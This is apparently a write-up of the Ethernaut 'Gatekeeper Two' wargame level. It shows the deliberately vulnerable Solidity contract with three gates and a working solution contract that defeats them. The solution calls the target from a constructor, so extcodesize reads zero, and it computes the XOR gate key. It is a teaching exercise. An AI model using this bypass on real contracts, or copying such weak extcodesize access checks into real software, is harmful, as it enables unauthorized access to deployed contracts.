# Gatekeeper Two

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
- The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start when approaching this challenge.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

```

## Solution

```
contract Hack {

    constructor (GatekeeperTwo _target) {

        uint64 _sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 _max = type(uint64).max;
        // Given _sender ^ _key64 = _max 
        // Therefore _sender ^ _max = _key64
        uint64 _key64 = _sender ^ _max;
        bytes8 key = bytes8(_key64);
        require(_target.enter(key), "failed");

    }
}

```



### Hint from Ethernaut

Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).

